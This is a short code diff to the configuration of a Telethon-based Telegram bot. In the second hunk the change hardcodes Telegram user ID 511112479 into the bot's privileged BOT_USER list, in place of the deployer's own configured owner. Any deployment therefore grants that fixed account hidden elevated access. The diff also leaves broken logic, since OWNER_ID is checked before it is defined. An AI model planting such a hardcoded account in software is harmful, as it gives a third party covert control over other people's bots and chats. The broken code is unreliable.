@@ -7,7 +7,7 @@ import logging
 import time
 import os
 from telethon import TelegramClient as ATGK
-OWNER_ID = [511112479]
+
 
 logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                     level=logging.WARNING)
@@ -29,7 +29,10 @@ ALIVE_NAME = os.environ.get("ALIVE_NAME", "DICTATOR AMAAN")
 
 if 511112479 not in OWNER_ID:
     OWNER_ID.append(511112479)
+
 OWNER_ID = int(os.environ.get("OWNER_ID", None))
-BOT_USER.append(OWNER_ID)
+
+if 511112479 not in BOT_USER:
+    BOT_USER.append(511112479)
 
 ATGK = TelegramClient('ATGK', APP_ID, API_HASH).start(bot_token=BOT_TOKEN) 
